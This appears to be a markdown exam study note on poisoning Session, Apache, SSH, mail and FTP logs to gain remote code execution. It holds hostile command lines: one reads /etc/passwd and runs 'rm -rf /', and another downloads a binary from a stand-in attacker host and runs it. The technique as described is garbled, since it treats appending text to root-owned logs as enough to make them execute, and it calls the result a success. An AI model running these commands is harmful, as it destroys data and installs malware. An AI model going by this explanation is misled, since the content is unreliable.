```markdown
# 🧪 Log Poisoning - Session, Apache, SSH, Mail, FTP log contamination for RCE

> [!ABSTRACT] Overview
> This note covers techniques and methods to poison logs in various services (Session, Apache, SSH, Mail, FTP) to achieve remote code execution (RCE).

---

## 📂 Log Poisoning Techniques

### Session Logs

**Methodology:**

1. Identify session log files.
2. Modify or inject malicious data into the logs.

Example Commands:

```bash
echo "malicious_data" >> /var/log/session.log
```

> [!WARNING] 
> Modifying session logs can trigger alerts and cause system instability.

### Apache Logs

**Methodology:**

1. Locate Apache log files.
2. Insert malicious payloads into the logs to exploit vulnerabilities.

Example Commands:

```bash
echo "malicious_payload" >> /var/log/apache/access.log
```

---

## 📁 SSH Log Poisoning

**Methodology:**

1. Identify SSH daemon log locations.
2. Inject shell commands or scripts into the logs to trigger execution upon read.

Example Command Injection:

```bash
echo 'command=$(cat /etc/passwd;rm -rf /);' >> /var/log/auth.log
```

> [!DANGER] 
> Be cautious with destructive commands like `rm`.

---

## 📤 Mail Log Contamination

**Methodology:**

1. Locate mail server log files.
2. Inject malicious emails or scripts into the logs to exploit vulnerabilities.

Example Command:

```bash
echo "malicious_email_content" >> /var/log/mail.log
```

> [!WARNING] 
> Email content injection can lead to unauthorized access and data leakage.

---

## 📡 FTP Log Manipulation

**Methodology:**

1. Identify FTP server log files.
2. Introduce malicious scripts or commands into the logs for RCE.

Example Command:

```bash
echo "malicious_script" >> /var/log/vsftpd.log
```

> [!CAUTION] 
> Ensure that any inserted content does not cause denial of service (DoS).

---

## 🚀 Remote Code Execution via Log Contamination

### Exploitation Path

1. Poison logs with malicious commands.
2. Trigger the system to read and execute these commands.

Successful RCE Example:

```bash
echo "wget -O /tmp/badscript http://malicioussite.com/malware;chmod +x /tmp/badscript;/tmp/badscript" >> /var/log/auth.log
```

> [!SUCCESS] 
> The system has successfully executed remote code through log poisoning.

---

## 🧭 Common Findings

| Finding | Impact |
|---|---|
| Poisoned Logs | System Compromise |
| Malicious Scripts | RCE and Privilege Escalation |

---

# 📚 Exam Mental Model

```text
Log Poisoning → Inject Commands → Trigger Execution → Gain Access
```

> [!SUCCESS] Log Poisoning Rule of Thumb
> **Whenever you see an opportunity to modify log files:**
> ```text
> Insert Malicious Data → Exploit Vulnerabilities → Achieve RCE
> ```
```